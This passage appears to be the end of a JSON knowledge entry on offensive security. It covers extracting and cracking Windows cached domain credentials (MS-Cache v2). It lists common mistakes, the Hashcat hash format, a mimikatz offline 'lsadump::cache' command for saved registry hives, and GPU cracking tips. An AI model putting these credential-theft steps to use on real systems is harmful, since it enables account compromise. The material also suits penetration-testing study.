MISTAKES:\n1. Attempting Pass-the-Hash with MS-Cache hash (doesn't work - must crack to plaintext)\n2. Not formatting hash correctly for Hashcat ($DCC2$10240#user#hash format required)\n3. Giving up on cracking too early (try multiple wordlists + rules)\n4. Not checking CachedLogonsCount (may be disabled via GPO)\n5. Forgetting username is case-sensitive in MS-Cache hash\n6. Not combining with SAM/Secrets dumps (complete credential picture needs all three)\n\nADVANCED USAGE:\n- Offline parsing: lsadump::cache /security:security.save /system:system.save\n- GPU cracking: Transfer hashes to Windows with NVIDIA GPU for 10-100x speed\n- Rainbow tables: Not practical for MS-Cache v2 due to iterations (use wordlists)\n- Historical analysis: Identify privileged user patterns (DA logging into workstations)"
    }
  ]
}